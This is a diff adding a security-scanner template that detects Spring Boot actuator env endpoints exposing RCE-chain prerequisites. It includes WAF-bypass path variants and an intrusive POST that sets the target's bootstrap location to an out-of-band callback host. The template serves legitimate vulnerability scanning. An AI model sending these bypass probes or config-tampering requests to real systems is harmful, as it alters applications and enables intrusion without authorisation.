@@ -1,0 +1,116 @@
+id: springboot-env-rce-chains
+
+info:
+  name: Spring Boot RCE Chain Prerequisites Detection
+  author: shafranpackeer
+  severity: critical
+  description: |
+    Identifies Spring Boot applications with environment configurations that enable
+    Remote Code Execution chains. Detects dangerous property combinations that can
+    be exploited through various RCE techniques including JNDI injection, expression
+    language injection, and template injection vulnerabilities.
+  reference:
+    - https://github.com/LandGrey/SpringBootVulExploit
+    - https://www.veracode.com/blog/research/spring-view-manipulation-vulnerability
+  metadata:
+    verified: true
+    max-request: 12
+    shodan-query: http.favicon.hash:116323821
+  tags: springboot,rce,chain,env,waf-bypass,intrusive
+
+http:
+  - method: GET
+    path:
+      # RCE-related environment endpoints
+      - "{{BaseURL}}/env"
+      - "{{BaseURL}}/actuator/env"
+
+      # URL encoded for WAF bypass
+      - "{{BaseURL}}/%65nv"
+      - "{{BaseURL}}/actuator/%65nv"
+
+      # Alternate paths
+      - "{{BaseURL}}/manage/env"
+      - "{{BaseURL}}/mgmt/env"
+
+      # Semicolon injection
+      - "{{BaseURL}}/env;.json"
+      - "{{BaseURL}}/actuator;/env"
+
+      # Path traversal
+      - "{{BaseURL}}/./env"
+      - "{{BaseURL}}//actuator/env"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "spring.cloud.bootstrap.location"
+          - "spring.datasource.hikari.connection-test-query"
+          - "spring.datasource.tomcat.validationQuery"
+          - "spring.h2.console.enabled"
+          - "spring.jpa.hibernate.ddl-auto"
+          - "logging.config"
+          - "spring.main.sources"
+          - "spring.groovy.template.check-template-location"
+          - "spring.freemarker.template-loader-path"
+          - "spring.velocity.resource-loader-path"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        regex:
+          - '"spring\.cloud\.bootstrap\.location"\s*:\s*"[^"]*"'
+          - '"logging\.config"\s*:\s*"[^"]*\.(xml|groovy)"'
+          - '"spring\.datasource\.[^"]*Query"\s*:\s*"[^"]*"'
+        condition: or
+
+    extractors:
+      - type: regex
+        name: rce-config-locations
+        regex:
+          - '"(spring\.cloud\.bootstrap\.location)"\s*:\s*"([^"]+)"'
+          - '"(logging\.config)"\s*:\s*"([^"]+)"'
+
+      - type: regex
+        name: dangerous-queries
+        regex:
+          - '"validationQuery"\s*:\s*"([^"]+)"'
+          - '"connection-test-query"\s*:\s*"([^"]+)"'
+
+      - type: regex
+        name: template-paths
+        regex:
+          - '"template-loader-path"\s*:\s*"([^"]+)"'
+          - '"resource-loader-path"\s*:\s*"([^"]+)"'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/actuator/env"
+      - "{{BaseURL}}/env"
+      - "{{BaseURL}}/%61ctuator/env"
+      - "{{BaseURL}}/manage/env"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "name": "spring.cloud.bootstrap.location",
+        "value": "http://{{interactsh-url}}/bootstrap.yml"
+      }
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 || status_code == 202'
+          - 'contains(body, "spring.cloud.bootstrap.location")'
+        condition: and
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
